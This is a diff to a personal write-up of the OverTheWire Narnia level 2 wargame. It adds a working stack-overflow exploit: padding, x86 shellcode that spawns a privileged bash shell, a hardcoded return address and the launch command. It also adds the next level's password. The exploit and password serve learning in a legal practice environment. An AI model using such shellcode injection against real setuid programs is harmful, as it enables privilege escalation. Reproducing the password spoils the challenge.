@@ -176,10 +176,31 @@ Let's get started:
     Or maybe there is another matter here?
 
 
+After many attempts, I gave up and started reading a [solution](https://mcpa.github.io/narnia/wargame/pwnable/overthewire/2015/10/10/narnia02/).
+The only thing I took from him (without understanding yet, sorry..) is that for some reason the beginning also needs to be padded. and change the address accordingly. When I tried it, it worked.
 
+And hence:
 
+```
+PADDING1=$(perl -e 'print "A"x64')
+```
+```
+SHELLCODE=$'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'
+```
+```
+PADDING2=$(perl -e 'print "A"x(128-33+4-64)')
+```
+```
+SHELLCODE_ADDR=$'\x38\xd4\xff\xff'
+```
+```
+./narnia2 $(echo -e $(echo -e $PADDING1)$(echo -e $SHELLCODE)$(echo -e $PADDING2)$(echo -e $SHELLCODE_ADDR))
+```
 
 ## Password for the next level:
 ```
-
+8SyQ2wyEDU
 ```
+
+## Appendix
+At this point I have the password the next level, but I still don't know the difference between running **inside** `gdb` and running **outside**. To understand this better, I went to see other solutions of this challenge, for example [here](https://www.youtube.com/watch?v=FMzOEIQouJk).
